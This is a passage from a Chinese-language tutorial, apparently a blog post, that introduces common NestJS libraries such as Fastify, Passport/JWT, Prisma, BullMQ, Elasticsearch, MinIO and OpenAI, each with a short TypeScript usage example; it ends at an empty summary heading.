<span class="hljs-keyword">import</span> { <span class="hljs-title class_">AppModule</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./app.module'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ValidationPipe</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">bootstrap</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> app = <span class="hljs-keyword">await</span> <span class="hljs-title class_">NestFactory</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">AppModule</span>);
  app.<span class="hljs-title function_">useGlobalPipes</span>(
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ValidationPipe</span>({
      <span class="hljs-attr">whitelist</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">transform</span>: <span class="hljs-literal">true</span>,
    }),
  );
  <span class="hljs-keyword">await</span> app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>);
}

<span class="hljs-title function_">bootstrap</span>();
</code></pre>
<h2 data-id="heading-1"><code>Fastify</code> 和 <code>@nestjs/platform-fastify</code></h2>
<p><code>Fastify</code> 是一个高性能 HTTP 引擎，相比 <code>Express</code> 更轻量、更适合高并发场景；<code>@nestjs/platform-fastify</code> 负责把 Fastify 接进 Nest，让你在业务层依然只写标准的 Controller、Guard、Interceptor 等。</p>
<p>搭配 <code>@fastify/helmet</code>、<code>@fastify/rate-limit</code>、<code>@fastify/cookie</code>、<code>@fastify/secure-session</code>、<code>@fastify/multipart</code>、<code>@fastify/static</code>，可以在统一框架里完成安全头、限流、会话、上传和静态资源托管。</p>
<p>基本使用案例：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// main.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">NestFactory</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/core'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">AppModule</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./app.module'</span>;
<span class="hljs-keyword">import</span> {
  <span class="hljs-title class_">FastifyAdapter</span>,
  <span class="hljs-title class_">NestFastifyApplication</span>,
} <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/platform-fastify'</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">bootstrap</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> app = <span class="hljs-keyword">await</span> <span class="hljs-title class_">NestFactory</span>.<span class="hljs-property">create</span>&lt;<span class="hljs-title class_">NestFastifyApplication</span>&gt;(
    <span class="hljs-title class_">AppModule</span>,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">FastifyAdapter</span>(),
  );
  <span class="hljs-keyword">await</span> app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-string">'0.0.0.0'</span>);
}

<span class="hljs-title function_">bootstrap</span>();
</code></pre>
<h2 data-id="heading-2"><code>@nestjs/config</code></h2>
<p><code>@nestjs/config</code> 是 Nest 官方的配置模块，用来统一管理多环境配置。思路很简单：所有数据库地址、第三方秘钥、开关配置等，都通过 <code>ConfigService</code> 读取，而不是在代码里到处散落 <code>process.env</code>。</p>
<p>推荐的做法是为不同领域写独立的配置工厂，然后在对应模块中注入使用。</p>
<p>基本使用案例：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// app.module.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Module</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ConfigModule</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/config'</span>;

<span class="hljs-meta">@Module</span>({
  <span class="hljs-attr">imports</span>: [
    <span class="hljs-title class_">ConfigModule</span>.<span class="hljs-title function_">forRoot</span>({
      <span class="hljs-attr">isGlobal</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">envFilePath</span>: <span class="hljs-string">'.env'</span>,
    }),
  ],
})
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppModule</span> {}
</code></pre>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// some.service.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Injectable</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ConfigService</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/config'</span>;

<span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SomeService</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> configService: ConfigService</span>) {}

  <span class="hljs-title function_">getDbUrl</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">configService</span>.<span class="hljs-property">get</span>&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">'DATABASE_URL'</span>);
  }
}
</code></pre>
<h2 data-id="heading-3"><code>Passport</code> 和 <code>JWT</code></h2>
<p><code>@nestjs/passport</code> 和 <code>@nestjs/jwt</code> 提供了一整套认证基础设施：<code>Passport</code> 统一管理各种认证策略（本地、JWT、OAuth 等），<code>JWT</code> 提供无状态令牌，让前后端分离、多端访问更容易管理。</p>
<p>常见流程是：通过本地策略验证用户名密码，登录成功后签发 <code>JWT</code>，后续请求通过 <code>AuthGuard('jwt')</code> 验证；接入第三方登录（如 GitHub）时，仅需增加新的 Passport 策略。</p>
<p>基本使用案例：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// auth.module.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Module</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">JwtModule</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/jwt'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">PassportModule</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/passport'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">JwtStrategy</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./jwt.strategy'</span>;

<span class="hljs-meta">@Module</span>({
  <span class="hljs-attr">imports</span>: [
    <span class="hljs-title class_">PassportModule</span>.<span class="hljs-title function_">register</span>({ <span class="hljs-attr">defaultStrategy</span>: <span class="hljs-string">'jwt'</span> }),
    <span class="hljs-title class_">JwtModule</span>.<span class="hljs-title function_">register</span>({
      <span class="hljs-attr">secret</span>: <span class="hljs-string">'secret'</span>, <span class="hljs-comment">// 实际项目请从 ConfigService 读取</span>
    }),
  ],
  <span class="hljs-attr">providers</span>: [<span class="hljs-title class_">JwtStrategy</span>],
  <span class="hljs-attr">exports</span>: [<span class="hljs-title class_">PassportModule</span>, <span class="hljs-title class_">JwtModule</span>],
})
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AuthModule</span> {}
</code></pre>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// some.controller.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Controller</span>, <span class="hljs-title class_">Get</span>, <span class="hljs-title class_">UseGuards</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">AuthGuard</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/passport'</span>;

<span class="hljs-meta">@Controller</span>(<span class="hljs-string">'profile'</span>)
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProfileController</span> {
  <span class="hljs-meta">@UseGuards</span>(<span class="hljs-title class_">AuthGuard</span>(<span class="hljs-string">'jwt'</span>))
  <span class="hljs-meta">@Get</span>()
  <span class="hljs-title function_">getProfile</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">ok</span>: <span class="hljs-literal">true</span> };
  }
}
</code></pre>
<h2 data-id="heading-4"><code>WebSocket</code> 和 <code>Socket.IO</code></h2>
<p>当系统需要即时通知、在线状态、协同编辑时，可以使用 <code>@nestjs/websockets</code> 搭配 <code>@nestjs/platform-socket.io</code> 和 <code>socket.io</code>。<code>Gateway</code> 充当“长连接入口”，负责管理连接、房间和事件。</p>
<p>更高级的协同场景中，还可以引入 <code>hocuspocus</code>、<code>yjs</code>、<code>y-prosemirror</code> 来负责文档协同算法，Nest 只需要负责连接管理和权限校验。</p>
<p>基本使用案例：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// chat.gateway.ts</span>
<span class="hljs-keyword">import</span> {
  <span class="hljs-title class_">WebSocketGateway</span>,
  <span class="hljs-title class_">WebSocketServer</span>,
  <span class="hljs-title class_">SubscribeMessage</span>,
  <span class="hljs-title class_">MessageBody</span>,
} <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/websockets'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Server</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'socket.io'</span>;

<span class="hljs-meta">@WebSocketGateway</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChatGateway</span> {
  <span class="hljs-meta">@WebSocketServer</span>()
  <span class="hljs-attr">server</span>: <span class="hljs-title class_">Server</span>;

  <span class="hljs-meta">@SubscribeMessage</span>(<span class="hljs-string">'message'</span>)
  <span class="hljs-title function_">handleMessage</span>(<span class="hljs-params"><span class="hljs-meta">@MessageBody</span>() data: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">server</span>.<span class="hljs-title function_">emit</span>(<span class="hljs-string">'message'</span>, data);
  }
}
</code></pre>
<h2 data-id="heading-5"><code>Prisma</code></h2>
<p><code>Prisma</code> 通过独立的 <code>schema.prisma</code> 文件定义模型，并生成强类型的 <code>PrismaClient</code>，非常适合在 Nest 的 Service 层中使用。它把数据库迁移、数据建模、类型安全绑在一起，能明显降低 SQL 错误和字段拼写错误的概率。</p>
<p>在 Service 中，直接注入封装好的 <code>PrismaService</code>，就可以用类型安全的方式进行增删改查。</p>
<p>基本使用案例：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// user.service.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Injectable</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">PrismaService</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/common/prisma/prisma.service'</span>;

<span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> prisma: PrismaService</span>) {}

  <span class="hljs-title function_">findAll</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">prisma</span>.<span class="hljs-property">user</span>.<span class="hljs-title function_">findMany</span>();
  }
}
</code></pre>
<h2 data-id="heading-6"><code>Redis</code> 和 <code>ioredis</code></h2>
<p><code>Redis</code> 是常见的缓存与中间层，而 <code>ioredis</code> 是稳定好用的 Node 客户端组合。它通常用于三个方向：缓存（加速读取）、分布式协调（锁、限流、防重复）、短期数据存储（会话、任务状态等）。</p>
<p>在 Nest 中一般会封装一个 <code>RedisService</code>，对外暴露 <code>get</code>、<code>set</code>、<code>incr</code> 等方法，避免直接在业务里使用底层客户端。</p>
<p>基本使用案例：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// redis.service.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Injectable</span>, <span class="hljs-title class_">OnModuleInit</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Redis</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'ioredis'</span>;

<span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">OnModuleInit</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">client</span>: <span class="hljs-title class_">Redis</span>;

  <span class="hljs-title function_">onModuleInit</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">client</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Redis</span>(<span class="hljs-string">'redis://localhost:6379'</span>);
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">key: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">client</span>.<span class="hljs-title function_">get</span>(key);
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">set</span>(<span class="hljs-params">key: <span class="hljs-built_in">string</span>, value: <span class="hljs-built_in">string</span>, ttlSeconds?: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-keyword">if</span> (ttlSeconds) {
      <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">client</span>.<span class="hljs-title function_">set</span>(key, value, <span class="hljs-string">'EX'</span>, ttlSeconds);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">client</span>.<span class="hljs-title function_">set</span>(key, value);
    }
  }
}
</code></pre>
<h2 data-id="heading-7"><code>BullMQ</code></h2>
<p><code>BullMQ</code> 是基于 <code>Redis</code> 的任务队列，<code>@nestjs/bullmq</code> 让你可以用装饰器方式定义队列和消费者。它适合承载各种耗时任务，例如大文件解析、批量导入导出、调用外部 AI 接口等。</p>
<p>这样可以把重任务从 HTTP 请求中剥离，避免接口超时，用户只需拿到一个“任务已受理”的 ID。</p>
<p>基本使用案例：</p>
<p>消费者（处理任务）：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// task.processor.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Processor</span>, <span class="hljs-title class_">WorkerHost</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/bullmq'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Job</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'bullmq'</span>;

<span class="hljs-meta">@Processor</span>(<span class="hljs-string">'tasks'</span>)
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TaskProcessor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">WorkerHost</span> {
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">job: Job</span>) {
    <span class="hljs-comment">// 这里处理耗时任务</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'processing job'</span>, job.<span class="hljs-property">id</span>, job.<span class="hljs-property">data</span>);
  }
}
</code></pre>
<p>生产者（投递任务）：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// task.service.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Injectable</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">InjectQueue</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/bullmq'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Queue</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'bullmq'</span>;

<span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TaskService</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-meta">@InjectQueue</span>(<span class="hljs-string">'tasks'</span>) <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> queue: Queue</span>) {}

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">createTask</span>(<span class="hljs-params">payload: <span class="hljs-built_in">any</span></span>) {
    <span class="hljs-keyword">const</span> job = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">queue</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'process'</span>, payload);
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">jobId</span>: job.<span class="hljs-property">id</span> };
  }
}
</code></pre>
<h2 data-id="heading-8"><code>Elasticsearch</code></h2>
<p><code>Elasticsearch</code> 在文档和知识类系统中通常用作结构化搜索与日志索引引擎。通过 <code>@elastic/elasticsearch</code> 客户端可以在 Nest 的 Service 里封装搜索接口，对外统一暴露“搜索文档”“搜索日志”等能力。</p>
<p>相对数据库原生查询，<code>Elasticsearch</code> 更擅长复杂查询、聚合统计、模糊搜索与搜索结果排序，是提升搜索体验的关键组件。</p>
<p>基本使用案例：</p>
<p>封装搜索 Service：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// search.service.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Injectable</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Client</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@elastic/elasticsearch'</span>;

<span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SearchService</span> {
  <span class="hljs-keyword">private</span> client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Client</span>({ <span class="hljs-attr">node</span>: <span class="hljs-string">'http://localhost:9200'</span> });

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">searchDocs</span>(<span class="hljs-params">keyword: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">client</span>.<span class="hljs-title function_">search</span>({
      <span class="hljs-attr">index</span>: <span class="hljs-string">'documents'</span>,
      <span class="hljs-attr">query</span>: {
        <span class="hljs-attr">multi_match</span>: {
          <span class="hljs-attr">query</span>: keyword,
          <span class="hljs-attr">fields</span>: [<span class="hljs-string">'title'</span>, <span class="hljs-string">'content'</span>],
        },
      },
    });
    <span class="hljs-keyword">return</span> res.<span class="hljs-property">hits</span>.<span class="hljs-property">hits</span>;
  }
}
</code></pre>
<h2 data-id="heading-9">对象存储（<code>MinIO</code>）</h2>
<p>当系统有大量文件（如 <code>PDF</code>、<code>Word</code>、图片、音频）时，本地磁盘很快就会吃不消，这时可以用自建的 <code>MinIO</code> 集群来做对象存储。它负责长期保存大文件，后端只需要关心对象名和访问地址，不必再直接管理磁盘。</p>
<p>在 Nest 中通常会封装一个存储 Service，对上层暴露“上传文件”“生成下载地址”等方法；同时配合 <code>imagekit</code>、<code>sharp</code>、<code>exiftool-vendored</code>、<code>pdf-parse</code>、<code>mammoth</code> 等，对文件做压缩、预览、元信息与文本提取等处理。</p>
<p>基本使用案例：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// storage.service.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Injectable</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Client</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'minio'</span>;

<span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StorageService</span> {
  <span class="hljs-keyword">private</span> client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Client</span>({
    <span class="hljs-attr">endPoint</span>: <span class="hljs-string">'localhost'</span>,
    <span class="hljs-attr">port</span>: <span class="hljs-number">9000</span>,
    <span class="hljs-attr">useSSL</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-attr">accessKey</span>: <span class="hljs-string">'minio'</span>,
    <span class="hljs-attr">secretKey</span>: <span class="hljs-string">'minio123'</span>,
  });

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">upload</span>(<span class="hljs-params">bucket: <span class="hljs-built_in">string</span>, objectName: <span class="hljs-built_in">string</span>, buffer: Buffer</span>) {
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">client</span>.<span class="hljs-title function_">putObject</span>(bucket, objectName, buffer);
    <span class="hljs-keyword">return</span> { bucket, objectName };
  }
}
</code></pre>
<h2 data-id="heading-10"><code>@nestjs/swagger</code></h2>
<p><code>@nestjs/swagger</code> 负责从 Controller 和 DTO 的装饰器中生成 OpenAPI 文档，让接口定义和代码实现保持同步，不再需要单独维护一份容易过期的接口文档。</p>
<p>在前后端分离项目中，Swagger 文档可以同时服务前端、测试与产品：前端对齐请求和响应结构，测试做接口验证，产品了解后端已有能力。</p>
<p>基本使用案例：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// main.ts 片段</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">SwaggerModule</span>, <span class="hljs-title class_">DocumentBuilder</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/swagger'</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">bootstrap</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> app = <span class="hljs-keyword">await</span> <span class="hljs-title class_">NestFactory</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">AppModule</span>);

  <span class="hljs-keyword">const</span> config = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DocumentBuilder</span>()
    .<span class="hljs-title function_">setTitle</span>(<span class="hljs-string">'API 文档'</span>)
    .<span class="hljs-title function_">setDescription</span>(<span class="hljs-string">'服务接口说明'</span>)
    .<span class="hljs-title function_">setVersion</span>(<span class="hljs-string">'1.0'</span>)
    .<span class="hljs-title function_">build</span>();

  <span class="hljs-keyword">const</span> <span class="hljs-variable language_">document</span> = <span class="hljs-title class_">SwaggerModule</span>.<span class="hljs-title function_">createDocument</span>(app, config);
  <span class="hljs-title class_">SwaggerModule</span>.<span class="hljs-title function_">setup</span>(<span class="hljs-string">'docs'</span>, app, <span class="hljs-variable language_">document</span>);

  <span class="hljs-keyword">await</span> app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>);
}
</code></pre>
<h2 data-id="heading-11"><code>class-validator</code> 和 <code>class-transformer</code></h2>
<p><code>class-validator</code> 通过在 DTO 类属性上添加装饰器（如 <code>IsString</code>、<code>IsInt</code>、<code>IsOptional</code> 等）定义字段的合法规则，<code>class-transformer</code> 负责把原始请求 JSON 转换成 DTO 实例。配合全局 <code>ValidationPipe</code>，可以保证进入 Controller 的数据已经过校验和转换。</p>
<p>这一体系大大减少了手写 if 校验的重复劳动，同时确保错误请求在统一入口被拦截并抛出合适的 HTTP 异常。</p>
<p>基本使用案例：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// create-user.dto.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">IsEmail</span>, <span class="hljs-title class_">IsString</span>, <span class="hljs-title class_">MinLength</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'class-validator'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateUserDto</span> {
  <span class="hljs-meta">@IsEmail</span>()
  <span class="hljs-attr">email</span>: <span class="hljs-built_in">string</span>;

  <span class="hljs-meta">@IsString</span>()
  <span class="hljs-meta">@MinLength</span>(<span class="hljs-number">6</span>)
  <span class="hljs-attr">password</span>: <span class="hljs-built_in">string</span>;
}
</code></pre>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// user.controller.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Body</span>, <span class="hljs-title class_">Controller</span>, <span class="hljs-title class_">Post</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">CreateUserDto</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./dto/create-user.dto'</span>;

<span class="hljs-meta">@Controller</span>(<span class="hljs-string">'users'</span>)
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
  <span class="hljs-meta">@Post</span>()
  <span class="hljs-title function_">create</span>(<span class="hljs-params"><span class="hljs-meta">@Body</span>() dto: CreateUserDto</span>) {
    <span class="hljs-keyword">return</span> dto;
  }
}
</code></pre>
<h2 data-id="heading-12"><code>Prometheus</code> 和 <code>Terminus</code></h2>
<p><code>@willsoto/nestjs-prometheus</code> 搭配 <code>prom-client</code> 可以方便地暴露各种指标端点，例如 HTTP 延迟、错误率、队列堆积情况等；<code>@nestjs/terminus</code> 则专注于健康检查，通过多种 <code>HealthIndicator</code> 检查数据库、<code>Redis</code>、<code>Elasticsearch</code>、<code>Qdrant</code> 等依赖服务是否可用。</p>
<p>在生产环境下，这两者为“可观测性”打基础，使运维和开发可以快速感知和定位问题。</p>
<p>基本使用案例：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// health.controller.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Controller</span>, <span class="hljs-title class_">Get</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> {
  <span class="hljs-title class_">HealthCheck</span>,
  <span class="hljs-title class_">HealthCheckService</span>,
  <span class="hljs-title class_">TypeOrmHealthIndicator</span>,
} <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/terminus'</span>;

<span class="hljs-meta">@Controller</span>(<span class="hljs-string">'health'</span>)
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HealthController</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">
    <span class="hljs-keyword">private</span> health: HealthCheckService,
    <span class="hljs-keyword">private</span> db: TypeOrmHealthIndicator,
  </span>) {}

  <span class="hljs-meta">@Get</span>()
  <span class="hljs-meta">@HealthCheck</span>()
  <span class="hljs-title function_">check</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">health</span>.<span class="hljs-title function_">check</span>([
      <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">db</span>.<span class="hljs-title function_">pingCheck</span>(<span class="hljs-string">'database'</span>),
    ]);
  }
}
</code></pre>
<h2 data-id="heading-13"><code>OpenAI</code> 和 <code>LangChain</code></h2>
<p><code>openai</code> 提供与大模型交互的基础接口，而 <code>langchain</code>、<code>@langchain/core</code>、<code>@langchain/community</code>、<code>@langchain/openai</code>、<code>@langchain/textsplitters</code> 则把模型调用、提示模板、工具调用、长文档切片等复杂逻辑抽象成可组合的模块。对于文档工作流类项目，这一层就是从“普通文档系统”升级为“智能文档系统”的关键。</p>
<p>在 Nest 中，通常会拆出一个 AI 模块，把“向量检索 + RAG + 模型调用”封装在 Service 里，再通过少量 HTTP 接口暴露出问答、总结、润色等能力。</p>
<p>基本使用案例：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// ai.service.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Injectable</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">OpenAI</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'openai'</span>;

<span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AiService</span> {
  <span class="hljs-keyword">private</span> client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAI</span>({ <span class="hljs-attr">apiKey</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">OPENAI_API_KEY</span> });

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">chat</span>(<span class="hljs-params">prompt: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">client</span>.<span class="hljs-property">chat</span>.<span class="hljs-property">completions</span>.<span class="hljs-title function_">create</span>({
      <span class="hljs-attr">model</span>: <span class="hljs-string">'gpt-4.1-mini'</span>,
      <span class="hljs-attr">messages</span>: [{ <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: prompt }],
    });
    <span class="hljs-keyword">return</span> res.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>]?.<span class="hljs-property">message</span>?.<span class="hljs-property">content</span> ?? <span class="hljs-string">''</span>;
  }
}
</code></pre>
<h2 data-id="heading-14">总结</h2>
